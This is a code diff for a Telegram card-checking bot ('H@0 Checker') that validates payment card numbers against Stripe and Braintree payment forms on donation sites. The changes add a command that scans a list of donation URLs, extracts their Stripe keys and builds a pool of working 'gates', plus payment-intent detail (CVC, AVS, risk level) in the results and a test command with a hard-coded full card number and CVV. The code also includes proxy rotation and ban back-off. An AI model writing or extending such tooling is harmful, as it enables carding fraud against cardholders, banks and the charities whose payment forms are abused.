@@ -23,7 +23,7 @@ except ImportError:
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from proxy_scraper import full_scrape_and_scrub, auto_scrub_loop, get_scrub_stats, get_scrubbed_proxies, proxy_pool_monitor, get_live_count, remove_dead_proxy, get_proxy_latency, TARGET_LIVE, REFILL_THRESHOLD, MAX_WORKERS
-from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ADMIN_CODE, TELEGRAM_ADMIN, STRIPE_PUB_KEY, get_proxy_dict, load_proxies, get_proxy_stats, get_pool_size, blacklist_proxy, clear_blacklist, set_gate_setting, get_all_gate_settings, is_gate_enabled, set_gate_enabled, get_notify, set_notify, get_all_notify, set_custom_chat_id, get_custom_chat_id, is_proxy_enabled, set_proxy_enabled, add_custom_proxy, remove_custom_proxy, get_custom_proxies, clear_custom_proxies, has_custom_proxies, get_config, get_all_configs, get_active_config_id, set_active_config, create_config, duplicate_config, delete_config, enable_config, disable_config, set_config_setting, set_config_name, get_config_stats, update_config_stats, get_enabled_configs, is_parallel_enabled, set_parallel_enabled, config_count, generate_redeem_key, redeem_key, get_all_redeem_keys, revoke_redeem_key, is_user_redeemed, cleanup_expired_keys, add_admin, remove_admin, get_all_admins, is_extra_admin, get_config_gate_type, set_config_gate_type, get_gate_setting, track_user_card, get_user_cards, get_user_card_file, clear_user_cards, get_user_check_count, increment_user_check_count, check_user_card_limit, get_user_limit, set_user_limit, get_all_user_limits, export_config_data, import_config_data
+from config import TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, ADMIN_CODE, TELEGRAM_ADMIN, STRIPE_PUB_KEY, get_proxy_dict, load_proxies, get_proxy_stats, get_pool_size, blacklist_proxy, clear_blacklist, set_gate_setting, get_all_gate_settings, is_gate_enabled, set_gate_enabled, get_notify, set_notify, get_all_notify, set_custom_chat_id, get_custom_chat_id, is_proxy_enabled, set_proxy_enabled, add_custom_proxy, remove_custom_proxy, get_custom_proxies, clear_custom_proxies, has_custom_proxies, get_config, get_all_configs, get_active_config_id, set_active_config, create_config, duplicate_config, delete_config, enable_config, disable_config, set_config_setting, set_config_name, get_config_stats, update_config_stats, get_enabled_configs, is_parallel_enabled, set_parallel_enabled, config_count, generate_redeem_key, redeem_key, get_all_redeem_keys, revoke_redeem_key, is_user_redeemed, cleanup_expired_keys, add_admin, remove_admin, get_all_admins, is_extra_admin, get_config_gate_type, set_config_gate_type, get_gate_setting, track_user_card, get_user_cards, get_user_card_file, clear_user_cards, get_user_check_count, increment_user_check_count, check_user_card_limit, get_user_limit, set_user_limit, get_all_user_limits, export_config_data, import_config_data, GATE_URLS, get_gate_pool, get_gate_pool_stats, update_gate_pool_entry, record_gate_success, record_gate_failure, get_next_ready_gate, get_ready_gate_count, add_gate_url, remove_gate_url, reset_gate_pool, find_gate_pool_url_by_site
 from stripe import get_rate_limiter, diagnose_gate, setup_gate_from_url, detect_gate_type
 from braintree_gate import check_braintree, setup_braintree_from_url
 from smart_gen import init_smart_gen, generate_card_lstm, generate_smart_batch, retrain as retrain_smart_gen
@@ -180,6 +180,58 @@ def _risk_level(detail):
     if any(s in d for s in ["insufficient", "cvv", "cvc", "avs", "velocity", "limit", "restriction"]):
         return "🟠 HIGH"
     return "🟢 LOW"
+
+
+def _fmt_pi_section(result):
+    lines = []
+    pi_status = result.get("pi_status") if isinstance(result, dict) else None
+    card_checks = result.get("card_checks", {}) if isinstance(result, dict) else {}
+    charge_outcome = result.get("charge_outcome", {}) if isinstance(result, dict) else {}
+    last_error = result.get("last_payment_error") if isinstance(result, dict) else None
+
+    if not pi_status and not card_checks and not charge_outcome:
+        return ""
+
+    lines.append("<b>🔍  PAYMENT INTENT</b>")
+    if pi_status:
+        pi_icons = {
+            "succeeded": "✅", "requires_action": "🔐",
+            "requires_payment_method": "❌", "requires_confirmation": "⏳",
+            "processing": "⏳", "canceled": "🚫",
+        }
+        icon = pi_icons.get(pi_status, "❓")
+        lines.append(f"{icon} Status: <code>{pi_status}</code>")
+
+    if last_error and isinstance(last_error, dict):
+        err_code = last_error.get("decline_code") or last_error.get("code", "")
+        err_msg = last_error.get("message", "")
+        if err_code:
+            lines.append(f"⚠️ Error: <code>{err_code}</code>")
+        if err_msg:
+            lines.append(f"💬 <code>{err_msg[:60]}</code>")
+
+    if card_checks:
+        cvc = card_checks.get("cvc_check", "?")
+        addr = card_checks.get("address_line1_check", "?")
+        zip_c = card_checks.get("address_postal_code_check", "?")
+        chk_icon = lambda v: "✅" if v == "pass" else ("❌" if v == "fail" else "➖")
+        lines.append(f"🔒 CVC: {chk_icon(cvc)} <code>{cvc}</code> · AVS: {chk_icon(addr)} <code>{addr}</code> · ZIP: {chk_icon(zip_c)} <code>{zip_c}</code>")
+
+    if charge_outcome:
+        net = charge_outcome.get("network_status", "")
+        risk = charge_outcome.get("risk_level", "")
+        seller = charge_outcome.get("seller_message", "")
+        if net:
+            lines.append(f"🌐 Network: <code>{net}</code>")
+        if risk:
+            risk_icon = {"normal": "🟢", "elevated": "🟡", "highest": "🔴"}.get(risk, "⚪")
+            lines.append(f"{risk_icon} Risk: <code>{risk}</code>")
+        if seller:
+            lines.append(f"🏦 <code>{seller[:50]}</code>")
+
+    if not lines or len(lines) <= 1:
+        return ""
+    return "\n".join(lines) + "\n"
 
 
 def fmt_live_msg(card_str, bin_info, gate_name, detail, proxy, tag="LIVE", cfg_label="", check_time=None):
@@ -594,23 +646,29 @@ class CCCrawler:
             status = result.get('status', 'declined')
             detail = result.get('detail', 'Unknown')
             gate_name = result.get('gate', 'Stripe Charitable')
+            pi_data = {
+                "card_checks": result.get("card_checks", {}),
+                "charge_outcome": result.get("charge_outcome", {}),
+                "pi_status": result.get("pi_status"),
+                "last_payment_error": result.get("last_payment_error"),
+            }
 
             SESSION_STATS['stripe_checks'] += 1
 
             if status == 'error':
                 self._gate_errors += 1
-                return False, "ERROR", detail, gate_name, elapsed
+                return False, "ERROR", detail, gate_name, elapsed, pi_data
 
             self._gate_errors = 0
 
             if status in ('live', 'charged'):
                 tag = "CHARGED" if status == 'charged' else "LIVE"
-                return True, tag, detail, gate_name, elapsed
-            return False, "DEAD", detail, gate_name, elapsed
+                return True, tag, detail, gate_name, elapsed, pi_data
+            return False, "DEAD", detail, gate_name, elapsed, pi_data
         except Exception as e:
             self._gate_errors += 1
             logger.error(f"Stripe Error: {str(e)[:80]}")
-        return False, "ERROR", "Gate Error", "Stripe Charitable", 0.0
+        return False, "ERROR", "Gate Error", "Stripe Charitable", 0.0, {}
 
     async def check_braintree_gate(self, card_str):
         try:
@@ -628,18 +686,18 @@ class CCCrawler:
 
             if status == 'error':
                 self._gate_errors += 1
-                return False, "ERROR", detail, gate_name, elapsed
+                return False, "ERROR", detail, gate_name, elapsed, {}
 
             self._gate_errors = 0
 
             if status in ('live', 'charged'):
                 tag = "CHARGED" if status == 'charged' else "LIVE"
-                return True, tag, detail, gate_name, elapsed
-            return False, "DEAD", detail, gate_name, elapsed
+                return True, tag, detail, gate_name, elapsed, {}
+            return False, "DEAD", detail, gate_name, elapsed, {}
         except Exception as e:
             self._gate_errors += 1
             logger.error(f"Braintree Error: {str(e)[:80]}")
-        return False, "ERROR", "Gate Error", "Braintree", 0.0
+        return False, "ERROR", "Gate Error", "Braintree", 0.0, {}
 
     async def check_card(self, card_str, gate_type="stripe"):
         if self._gate_errors >= 5:
@@ -649,6 +707,7 @@ class CCCrawler:
 
         proxy_used = None
         check_time = 0.0
+        pi_data = {}
         if gate_type == "braintree":
             from braintree_gate import get_bt_rate_limiter
             bt_rl = get_bt_rate_limiter()
@@ -658,7 +717,7 @@ class CCCrawler:
                 while bt_rl.get_stats().get('is_banned'):
                     await asyncio.sleep(5)
 
-            is_live, tag, detail, gate_name, check_time = await self.check_braintree_gate(card_str)
+            is_live, tag, detail, gate_name, check_time, pi_data = await self.check_braintree_gate(card_str)
             proxy_used = getattr(self, '_last_bt_proxy', None)
 
             backoff = bt_rl.get_stats().get('backoff_level', 0)
@@ -677,14 +736,14 @@ class CCCrawler:
                 while rl.get_stats().get('is_banned'):
                     await asyncio.sleep(5)
 
-            is_live, tag, detail, gate_name, check_time = await self.check_stripe(card_str)
+            is_live, tag, detail, gate_name, check_time, pi_data = await self.check_stripe(card_str)
 
             backoff = rl.get_stats().get('backoff_level', 0)
             base_delay = random.uniform(2.0, 4.0)
             extra_delay = backoff * random.uniform(0.5, 1.5)
             await asyncio.sleep(base_delay + extra_delay)
 
-        return is_live, tag, detail, gate_name, proxy_used, check_time
+        return is_live, tag, detail, gate_name, proxy_used, check_time, pi_data
 
     def _expand_bin_pattern(self, bin_str):
         result = []
@@ -982,7 +1041,10 @@ def register_handlers(dp):
             "/setupgate <code>[url]</code> · /gate · /setgate\n"
             "/gateon · /gateoff · /chk <code>[cc]</code> · /autofix\n"
             "/hybrid <code>[on|off]</code> — Playwright hybrid mode\n"
-            "/masscheck <code>[gate] [limit]</code>\n\n"
+            "/masscheck <code>[gate] [limit]</code>\n"
+            "/autogates — Auto-setup all gates from URL pool\n"
+            "/gatepool — View gate pool status & health\n"
+            "/testcard — Quick test with real bank response\n\n"
             "🌐 <b>PROXY</b>\n"
             "/proxy <code>[on|off]</code> · /addproxy <code>[ip:port]</code>\n"
             "/removeproxy · /proxies · /clearproxies\n"
@@ -1914,8 +1976,9 @@ def register_handlers(dp):
 
         try:
             check_time = None
+            pi_data = {}
             if crawler_instance:
-                is_live, tag, detail, gate_name, proxy_used, check_time = await crawler_instance.check_card(card_str, gate_type=active_gt)
+                is_live, tag, detail, gate_name, proxy_used, check_time, pi_data = await crawler_instance.check_card(card_str, gate_type=active_gt)
             else:
                 t0 = time.time()
                 if active_gt == "braintree":
@@ -1932,12 +1995,21 @@ def register_handlers(dp):
                 is_live = status in ('live', 'charged')
                 tag = "CHARGED" if status == 'charged' else ("LIVE" if is_live else "DEAD")
                 proxy_used = None
+                pi_data = {
+                    "card_checks": result.get("card_checks", {}),
+                    "charge_outcome": result.get("charge_outcome", {}),
+                    "pi_status": result.get("pi_status"),
+                    "last_payment_error": result.get("last_payment_error"),
+                }
 
             proxy_display = proxy_used if proxy_used else "DIRECT"
             bin_info = await safe_bin_info(crawler_instance, cc[:6])
 
             if is_live:
+                pi_section = _fmt_pi_section(pi_data)
                 msg = fmt_chk_live(card_str, cc, bin_info, gate_name, detail, proxy_display, tag, check_time)
+                if pi_section:
+                    msg = msg.replace("<code>━━━ H@0 Checker V6.0 ━━━</code>", f"{pi_section}\n<code>━━━ H@0 Checker V6.0 ━━━</code>")
                 await message.reply(msg, parse_mode='HTML')
                 track_user_card(chk_uid, card_str, "live")
             else:
@@ -2589,8 +2661,9 @@ def register_handlers(dp):
                         break
                     try:
                         check_time = None
+                        pi_data = {}
                         if crawler:
-                            is_live, tag, detail, gate_name, proxy_used, check_time = await crawler.check_card(card_str, gate_type=gt)
+                            is_live, tag, detail, gate_name, proxy_used, check_time, pi_data = await crawler.check_card(card_str, gate_type=gt)
                         else:
                             t0 = time.time()
                             if gt == "braintree":
@@ -2607,6 +2680,12 @@ def register_handlers(dp):
                             is_live = status in ('live', 'charged')
                             tag = "CHARGED" if status == 'charged' else ("LIVE" if is_live else "DEAD")
                             proxy_used = None
+                            pi_data = {
+                                "card_checks": result.get("card_checks", {}),
+                                "charge_outcome": result.get("charge_outcome", {}),
+                                "pi_status": result.get("pi_status"),
+                                "last_payment_error": result.get("last_payment_error"),
+                            }
 
                         proxy_display = proxy_used if proxy_used else "DIRECT"
                         gt_label = "Stripe" if gt == "stripe" else "Braintree"
@@ -2625,7 +2704,10 @@ def register_handlers(dp):
                                 SESSION_STATS['charged'] += 1
 
                             bin_info = await safe_bin_info(crawler, cc[:6])
+                            pi_section = _fmt_pi_section(pi_data)
                             live_message = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, f" [MC]", check_time)
+                            if pi_section:
+                                live_message = live_message.replace("<code>━━━ H@0 Checker V6.0 ━━━</code>", f"{pi_section}\n<code>━━━ H@0 Checker V6.0 ━━━</code>")
 
                             keyboard = InlineKeyboardMarkup(inline_keyboard=[
                                 [InlineKeyboardButton(text="💎 H@0", url="https://t.me/historyindaysd")]
@@ -3132,6 +3214,363 @@ def register_handlers(dp):
                 f"━━━━━━━━━━━━━━━━━━━━\n\n"
                 f"<code>{str(e)[:60]}</code>\n\n"
                 f"<code>━━ H@0 ━━</code>",
+                parse_mode='HTML'
+            )
+
+    _autogates_running = False
+
+    @dp.message_handler(commands=['autogates'])
+    async def cmd_autogates(message: Message):
+        nonlocal _autogates_running
+        if not is_admin(message.from_user.id, message.from_user.username):
+            await message.reply("🔒 Admin only.", parse_mode='HTML')
+            return
+
+        args = message.get_args()
+        if args and args.strip().lower() == "reset":
+            reset_gate_pool()
+            await message.reply(
+                "<b>🔄  GATE POOL RESET</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"All <code>{len(GATE_URLS)}</code> gates reset to pending.\n"
+                "Run <code>/autogates</code> to re-scan.\n\n"
+                "<code>━━ H@0 ━━</code>",
+                parse_mode='HTML'
+            )
+            return
+
+        if args and args.strip().lower() == "stop":
+            _autogates_running = False
+            await message.reply(
+                "<b>⏹  AUTO-GATES STOPPED</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━\n\n"
+                "<code>━━ H@0 ━━</code>",
+                parse_mode='HTML'
+            )
+            return
+
+        if _autogates_running:
+            pool_stats = get_gate_pool_stats()
+            await message.reply(
+                "<b>⚠️  ALREADY RUNNING</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📊 Progress: {pool_stats['ready']+pool_stats['failed']}/{pool_stats['total']}\n"
+                f"✅ Ready: <code>{pool_stats['ready']}</code>\n"
+                f"❌ Failed: <code>{pool_stats['failed']}</code>\n"
+                f"⏳ Pending: <code>{pool_stats['pending']}</code>\n\n"
+                "Use <code>/autogates stop</code> to cancel.\n\n"
+                "<code>━━ H@0 ━━</code>",
+                parse_mode='HTML'
+            )
+            return
+
+        _autogates_running = True
+        total = len(GATE_URLS)
+        await message.reply(
+            "<b>🚀  AUTO-GATES STARTING</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"🌐 Testing <code>{total}</code> donation URLs...\n"
+            "🔍 Auto-detecting gate types\n"
+            "🔑 Auto-extracting Stripe keys\n"
+            "📋 Building gate pool\n\n"
+            "⏳ This may take a few minutes.\n"
+            "Use <code>/gatepool</code> to check status.\n\n"
+            "<code>━━ H@0 ━━</code>",
+            parse_mode='HTML'
+        )
+
+        loop = asyncio.get_event_loop()
+        ready_count = 0
+        fail_count = 0
+        first_ready_url = None
+        first_ready_settings = None
+        first_ready_gate_type = None
+
+        try:
+            for i, url in enumerate(GATE_URLS):
+                if not _autogates_running:
+                    break
+
+                update_gate_pool_entry(url, status="testing")
+
+                try:
+                    gate_info = await loop.run_in_executor(None, detect_gate_type, url)
+                    detected_type = gate_info.get("gate_type", "stripe")
+                    confidence = gate_info.get("confidence", "low")
+
+                    update_gate_pool_entry(url, gate_type=detected_type, confidence=confidence)
+
+                    if detected_type == "braintree":
+                        result = await loop.run_in_executor(None, setup_braintree_from_url, url)
+                    else:
+                        result = await loop.run_in_executor(None, setup_gate_from_url, url)
+
+                    update_gate_pool_entry(url, setup_result=result)
+
+                    if result.get("success"):
+                        update_gate_pool_entry(url, status="ready")
+                        ready_count += 1
+                        if first_ready_url is None:
+                            first_ready_url = url
+                            first_ready_gate_type = detected_type
+                            first_ready_settings = get_all_gate_settings(detected_type).copy()
+                            active_cid = get_active_config_id()
+                            set_config_gate_type(active_cid, detected_type)
+                            for k, v in first_ready_settings.items():
+                                set_config_setting(active_cid, k, v)
+                            enable_config(active_cid)
+                            set_gate_enabled(detected_type, True)
+                    else:
+                        errors = result.get("errors", [])
+                        err_msg = errors[0] if errors else "Setup failed"
+                        update_gate_pool_entry(url, status="failed", error=err_msg)
+                        fail_count += 1
+
+                except Exception as e:
+                    update_gate_pool_entry(url, status="failed", error=str(e)[:60])
+                    fail_count += 1
+
+                if (i + 1) % 10 == 0 and _autogates_running:
+                    try:
+                        last_url_short = url[:35] + "..." if len(url) > 35 else url
+                        last_status = "ready" if result.get("success") else "failed"
+                        last_form = result.get("form_type", "?") if isinstance(result, dict) else "?"
+                        await message.reply(
+                            f"<b>⏳  PROGRESS {i+1}/{total}</b>\n"
+                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
+                            f"✅ Ready: <code>{ready_count}</code>\n"
+                            f"❌ Failed: <code>{fail_count}</code>\n"
+                            f"⏳ Remaining: <code>{total - i - 1}</code>\n\n"
+                            f"📄 Last: <code>{last_url_short}</code>\n"
+                            f"   Status: {last_status} · Form: {last_form}\n\n"
+                            f"<code>━━ H@0 ━━</code>",
+                            parse_mode='HTML'
+                        )
+                    except Exception:
+                        pass
+
+            if first_ready_settings and first_ready_gate_type:
+                active_cid = get_active_config_id()
+                set_config_gate_type(active_cid, first_ready_gate_type)
+                for k, v in first_ready_settings.items():
+                    set_config_setting(active_cid, k, v)
+
+            pool_stats = get_gate_pool_stats()
+            pool = get_gate_pool()
+
+            ready_lines = ""
+            fail_lines = ""
+            ready_count_display = 0
+            fail_count_display = 0
+            for url, info in pool.items():
+                if info["status"] == "ready" and ready_count_display < 15:
+                    gt = (info.get("gate_type") or "stripe").upper()
+                    conf = info.get("confidence", "?")
+                    short_url = url[:45] + "..." if len(url) > 45 else url
+                    ready_lines += f"  ✅ <code>{short_url}</code> [{gt}/{conf}]\n"
+                    ready_count_display += 1
+                elif info["status"] == "failed" and fail_count_display < 10:
+                    err = info.get("last_error", "unknown")[:35]
+                    short_url = url[:35] + "..." if len(url) > 35 else url
+                    fail_lines += f"  ❌ <code>{short_url}</code>\n      <i>{err}</i>\n"
+                    fail_count_display += 1
+
+            first_gate_line = ""
+            if first_ready_url:
+                short = first_ready_url[:45] + "..." if len(first_ready_url) > 45 else first_ready_url
+                first_gate_line = f"\n🎯 Active: <code>{short}</code>\n"
+
+            await message.reply(
+                "<b>🏁  AUTO-GATES COMPLETE</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"📊 Total: <code>{pool_stats['total']}</code>\n"
+                f"✅ Ready: <code>{pool_stats['ready']}</code>\n"
+                f"❌ Failed: <code>{pool_stats['failed']}</code>\n"
+                f"{first_gate_line}\n"
+                + (f"<b>✅  READY GATES</b>\n{ready_lines}\n" if ready_lines else "")
+                + (f"<b>❌  FAILED</b>\n{fail_lines}\n" if fail_lines else "")
+                + "\n<b>💡  NEXT</b>\n"
+                "  • <code>/gatepool</code> — View full pool\n"
+                "  • <code>/testcard</code> — Quick gate test\n"
+                "  • <code>/chk CC|MM|YY|CVV</code> — Check a card\n"
+                "  • <code>/autogates reset</code> — Re-scan all\n\n"
+                "<code>━━ H@0 ━━</code>",
+                parse_mode='HTML'
+            )
+        finally:
+            _autogates_running = False
+
+    @dp.message_handler(commands=['gatepool'])
+    async def cmd_gatepool(message: Message):
+        if not is_authorized(message.from_user.id, message.from_user.username):
+            await message.reply("🔒 Access denied.", parse_mode='HTML')
+            return
+
+        pool_stats = get_gate_pool_stats()
+        pool = get_gate_pool()
+
+        lines = ""
+        for url, info in pool.items():
+            status_icon = {
+                "ready": "✅", "failed": "❌", "pending": "⏳",
+                "testing": "🔄", "dead": "💀",
+            }.get(info["status"], "❓")
+            gt = (info.get("gate_type") or "?").upper()[:2]
+            health = info.get("health_score", 0)
+            sc = info.get("success_count", 0)
+            fc = info.get("fail_count", 0)
+            short_url = url[:40] + "..." if len(url) > 40 else url
+            lines += f"{status_icon} <code>{short_url}</code>\n"
+            lines += f"   {gt} H:{health} ✓{sc} ✗{fc}\n"
+
+        if not lines:
+            lines = "  No gates configured.\n  Run <code>/autogates</code>\n"
+
+        await message.reply(
+            "<b>🌐  GATE POOL</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"📊 Total: <code>{pool_stats['total']}</code> · "
+            f"✅ <code>{pool_stats['ready']}</code> · "
+            f"❌ <code>{pool_stats['failed']}</code> · "
+            f"⏳ <code>{pool_stats['pending']}</code>\n\n"
+            f"{lines}\n"
+            "<b>💡  COMMANDS</b>\n"
+            "  <code>/autogates</code> — Scan all URLs\n"
+            "  <code>/autogates reset</code> — Reset pool\n"
+            "  <code>/testcard</code> — Test active gate\n\n"
+            "<code>━━ H@0 ━━</code>",
+            parse_mode='HTML'
+        )
+
+    @dp.message_handler(commands=['testcard'])
+    async def cmd_testcard(message: Message):
+        if not is_admin(message.from_user.id, message.from_user.username):
+            await message.reply("🔒 Admin only.", parse_mode='HTML')
+            return
+
+        test_cc = "4839505786618469"
+        test_mm = "11"
+        test_yy = "26"
+        test_cvv = "888"
+        test_card = f"{test_cc}|{test_mm}|{test_yy}|{test_cvv}"
+
+        brand = get_card_brand(test_cc[:6])
+        active_gt = get_config_gate_type(get_active_config_id())
+        gate_display = "Braintree" if active_gt == "braintree" else "Stripe"
+
+        await message.reply(
+            "<b>🧪  GATE TEST</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"💳 <code>{test_cc[:6]}****{test_cc[-4:]}</code>\n"
+            f"📋 {brand} · Luhn ✅\n"
+            f"🛡 Gate: {gate_display}\n"
+            f"🎯 Testing real bank response...\n\n"
+            "<code>━━ H@0 ━━</code>",
+            parse_mode='HTML'
+        )
+
+        try:
+            check_time = None
+            pi_data = {}
+            loop = asyncio.get_event_loop()
+
+            if crawler_instance:
+                is_live, tag, detail, gate_name, proxy_used, check_time, pi_data = await crawler_instance.check_card(test_card, gate_type=active_gt)
+            else:
+                t0 = time.time()
+                if active_gt == "braintree":
+                    result = await loop.run_in_executor(None, check_braintree, test_cc, test_mm, test_yy, test_cvv)
+                else:
+                    from stripe import check_stripe as _chk
+                    result = await loop.run_in_executor(None, _chk, test_cc, test_mm, test_yy, test_cvv)
+                check_time = time.time() - t0
+                status = result.get('status', 'declined')
+                detail = result.get('detail', 'Unknown')
+                gate_name = result.get('gate', gate_display)
+                is_live = status in ('live', 'charged')
+                tag = "CHARGED" if status == 'charged' else ("LIVE" if is_live else "DEAD")
+                proxy_used = None
+                pi_data = {
+                    "card_checks": result.get("card_checks", {}),
+                    "charge_outcome": result.get("charge_outcome", {}),
+                    "pi_status": result.get("pi_status"),
+                    "last_payment_error": result.get("last_payment_error"),
+                }
+
+            proxy_display = proxy_used if proxy_used else "DIRECT"
+            bin_info = await safe_bin_info(crawler_instance, test_cc[:6])
+
+            time_str = f" in {check_time:.1f}s" if check_time else ""
+
+            gate_url = get_gate_setting(active_gt, "site_url", "N/A")
+            ready_gates = get_ready_gate_count()
+            pi_section = _fmt_pi_section(pi_data)
+
+            if is_live:
+                auth_type, auth_desc = _classify_auth_type(tag, detail)
+                await message.reply(
+                    f"<b>🧪  TEST RESULT — {auth_type}</b>\n"
+                    "━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"💳 <code>{test_card}</code>\n"
+                    f"🏦 {bin_info['brand']} · {bin_info['type']} · {bin_info['level']}\n"
+                    f"🏦 {bin_info['bank']}\n"
+                    f"{bin_info['country_flag']} {bin_info['country_name']}\n\n"
+                    f"<b>📝 RESPONSE</b>\n"
+                    f"🛡 <code>{gate_name}</code>\n"
+                    f"💬 <code>{detail}</code>\n"
+                    f"📋 {auth_desc}\n"
+                    f"⏱ <code>{time_str}</code>\n\n"
+                    f"{pi_section}"
+                    f"<b>🌐 GATE STATUS</b>\n"
+                    f"🎯 <code>{gate_url[:40]}</code>\n"
+                    f"📊 Pool: <code>{ready_gates}</code> ready gates\n\n"
+                    "🟢 <b>Gate is WORKING — real bank response!</b>\n\n"
+                    "<code>━━ H@0 ━━</code>",
+                    parse_mode='HTML'
+                )
+                pool_url = find_gate_pool_url_by_site(get_gate_setting(active_gt, "site_url", ""))
+                if pool_url:
+                    record_gate_success(pool_url)
+            else:
+                await message.reply(
+                    "<b>🧪  TEST RESULT</b>\n"
+                    "━━━━━━━━━━━━━━━━━━━━\n\n"
+                    f"💳 <code>{test_card}</code>\n"
+                    f"🏦 {bin_info['brand']} · {bin_info['type']}\n\n"
+                    f"<b>📝 RESPONSE</b>\n"
+                    f"🛡 <code>{gate_name}</code>\n"
+                    f"💬 <code>{detail}</code>\n"
+                    f"⏱ <code>{time_str}</code>\n\n"
+                    f"{pi_section}"
+                    f"<b>🌐 GATE STATUS</b>\n"
+                    f"🎯 <code>{gate_url[:40]}</code>\n"
+                    f"📊 Pool: <code>{ready_gates}</code> ready gates\n\n"
+                    "🔴 <b>Card declined — gate IS responding (real bank)</b>\n\n"
+                    "<b>💡 NOTE</b>\n"
+                    "A decline means the gate is working and\n"
+                    "the bank gave a real response.\n\n"
+                    "<code>━━ H@0 ━━</code>",
+                    parse_mode='HTML'
+                )
+                pool_url = find_gate_pool_url_by_site(get_gate_setting(active_gt, "site_url", ""))
+                if pool_url:
+                    record_gate_success(pool_url)
+
+        except Exception as e:
+            logger.error(f"Testcard error: {e}")
+            pool_url = find_gate_pool_url_by_site(get_gate_setting(active_gt, "site_url", ""))
+            if pool_url:
+                record_gate_failure(pool_url, str(e)[:60])
+
+            await message.reply(
+                "<b>❌  TEST FAILED</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"<code>{str(e)[:80]}</code>\n\n"
+                "<b>💡  FIX</b>\n"
+                "  • <code>/autogates</code> to re-scan gates\n"
+                "  • <code>/autofix</code> to diagnose\n"
+                "  • <code>/gatepool</code> to see pool status\n\n"
+                "<code>━━ H@0 ━━</code>",
                 parse_mode='HTML'
             )
 
@@ -4878,7 +5317,7 @@ async def checking_loop(bot, chat_id, crawler):
                     prev_active = get_active_config_id()
                     set_active_config(check_cid)
 
-                    is_live, tag, detail, gate_name, proxy_used, check_time = await crawler.check_card(card_str, gate_type=cfg_gate_type)
+                    is_live, tag, detail, gate_name, proxy_used, check_time, pi_data = await crawler.check_card(card_str, gate_type=cfg_gate_type)
                     SESSION_STATS['total_checked'] += 1
                     update_config_stats(check_cid, 'checked')
 
@@ -4936,7 +5375,10 @@ async def checking_loop(bot, chat_id, crawler):
                             update_config_stats(check_cid, 'charged')
 
                         bin_info = await safe_bin_info(crawler, cc[:6])
+                        pi_section = _fmt_pi_section(pi_data)
                         live_message = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, cfg_label, check_time)
+                        if pi_section:
+                            live_message = live_message.replace("<code>━━━ H@0 Checker V6.0 ━━━</code>", f"{pi_section}\n<code>━━━ H@0 Checker V6.0 ━━━</code>")
 
                         keyboard = InlineKeyboardMarkup(inline_keyboard=[
                             [InlineKeyboardButton(text="💎 H@0", url="https://t.me/historyindaysd")]
@@ -5169,7 +5611,7 @@ async def main_loop():
             f"📋 <code>{len(crawler.bins)}</code> BINs · 📂 <code>{len(crawler.cc_list)}</code> test cards\n"
             f"🔀 Parallel {'🟢' if is_parallel_enabled() else '🔴'}\n"
             f"🔔 {n_live} Live  {n_dec} Decline  {n_err} Errors\n\n"
-            f"📖 /help · /setupgate [url]\n\n"
+            f"📖 /help · /autogates · /testcard\n\n"
             f"<code>━━ H@0 V6.0 ━━</code>"
         )
         await bot.send_message(get_active_chat_id(), startup_msg, parse_mode='HTML')
